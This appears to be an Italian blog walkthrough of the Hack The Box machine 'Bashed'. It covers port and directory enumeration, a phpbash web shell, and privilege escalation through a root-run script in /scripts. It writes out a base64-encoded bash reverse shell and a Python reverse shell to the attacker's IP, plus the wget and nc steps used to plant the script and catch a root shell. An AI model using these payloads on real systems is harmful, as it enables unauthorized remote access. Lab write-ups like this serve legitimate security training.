---
title: "Bashed Walkthrough"
description: "Bashed è una macchina abbastanza easy che si concentra principalmente sul fuzzing e sull'individuazione di file importanti. L'accesso base al crontab è limitato."
author: dua2z3rr
date: 2025-08-25 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Common Applications", "Area di Interesse: Web Application", "Vulnerabilità: OS Command Injection", "Vulnerabilità: File System Configuration", "Vulnerabilità: Code Execution"]
image: /assets/img/bashed/bashed-resized.png"
---

## Enumerazione Esterna

### Nmap

Cominciamo con un nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.68 -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.68 -vv -p 80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### HTTP

![Desktop View](/assets/img/bashed/bashed-home-page.png)

Esploriamo il sito. Notiamo subito che il sito è chiamato `Arrexel's Development Site`. Potremmo utilizzare Arrexel come user name più avanti.

![Desktop View](/assets/img/bashed/bashed-phpbash.png)

Grazie a questo abbiamo la certezza di cosa dobbiamo exploitare. Continuiamo a leggere per ultieriori indizi su **phpbash**

![Desktop View](/assets/img/bashed/bashed-passwd.png)

Abbiamo anche uno screenshot del file `/etc/passwd`. Da questo vediamo la presenza di selinux (Security Enhanced Linux), un mandatory access control per linux.

Infine, Abbiamo un link della pagina github del progetto precedente: <https://github.com/Arrexel/phpbash>. L'ultima commit si chiama **Patch XSS vuln**. Controlliamo le modifiche applicate.

![Desktop View](/assets/img/bashed/bashed-last-commit-text-comparison.png)

Esiste anche un issue dove viene reportato un modo per applicare una vulnerabilità XSS.

![Desktop View](/assets/img/bashed/bashed-xss.png)

Quindi, sappiamo che phpbash è una semi-interactive shell è che è stata installata sul target ip. Magari si trova in una directory specifica, proviamo a fare fuzzing per trovarla.

### FFUF

```shell
┌─[dua2z3rr@parrot]─[~/SecLists/Discovery/Web-Content]
└──╼ $ffuf -w DirBuster-2007_directory-list-2.3-big.txt:FUZZ -u http://bashed.htb/FUZZ -recursion -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bashed.htb/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 43ms]
[INFO] Adding a new job to the queue: http://bashed.htb/images/FUZZ

                        [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 44ms]
uploads                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 44ms]
[INFO] Adding a new job to the queue: http://bashed.htb/uploads/FUZZ

php                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 41ms]
[INFO] Adding a new job to the queue: http://bashed.htb/php/FUZZ

css                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 41ms]
[INFO] Adding a new job to the queue: http://bashed.htb/css/FUZZ

dev                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 67ms]
[INFO] Adding a new job to the queue: http://bashed.htb/dev/FUZZ

js                      [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 49ms]
[INFO] Adding a new job to the queue: http://bashed.htb/js/FUZZ

fonts                   [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 40ms]
[INFO] Adding a new job to the queue: http://bashed.htb/fonts/FUZZ
```

Se entriamo in ogni cartella manualmente, troveremo nella directory `dev` la repository di github precedente.

Basta cliccare su phpbash.php per ottenere una shell come `www-data`. Andiamo nella home directory di `arrexel` e ottenere la user flag.

## Shell come www-data

### Enumerazione interna

Attraverso il comando `sudo -l` possiamo vedere che abbiamo il permesso di usare qualsiasi comando essendo lo user `scriptmanager`.

![Desktop View](/assets/img/bashed/bashed-sudo-l.png)

Per comodità, otteniamo una reverse shell.

```shell
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjkvOTAwMSAwPiYx | base64 -d | bash
```

Ora diventiamo `scriptmanager`.

```shell
www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash -i
sudo -u scriptmanager bash -i
bash: cannot set terminal process group (809): Inappropriate ioctl for device
bash: no job control in this shell
scriptmanager@bashed:/home/arrexel$ 
<SNIP>
scriptmanager@bashed:/$ ls -al
ls -al
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            174 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 Aug 24 23:07 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 181 root          root              0 Aug 24 23:07 proc
drwx------   3 root          root           4096 Aug 24 23:08 root
drwxr-xr-x  18 root          root            500 Aug 24 23:07 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Aug 25 03:08 sys
drwxrwxrwt  10 root          root           4096 Aug 25 04:05 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

Vediamo una cartella accessibile solo da `scriptmanager`. All'interno esiste il file `test.py` che scrive un file. vediamo che il file creato è di proprietà di root. Possiamo dedurre che il programma venga eseguito da root. Modifichiamo il programma per ottenere una reverse shell come root.

Sulla nostra macchina:

```shell
┌─[dua2z3rr@parrot]─[~/Desktop]
└──╼ $cat test.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.9",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

┌─[dua2z3rr@parrot]─[~/Desktop]
└──╼ $ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

> È importante togliere i punti e virgola e andare a capo! sono rimasto bloccato per molto tempo!
{: .prompt-tip }

Macchina target:

```shell
scriptmanager@bashed:/scripts$ rm test.py; wget http://10.10.16.9:8000/test.py
```

Nostra macchina:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~/SecLists/Discovery/DNS]
└──╼ $nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.10.68 41560
/bin/sh: 0: can't access tty; job control turned off
# cd /root
```

Terminiamo la box prendendo la root flag.
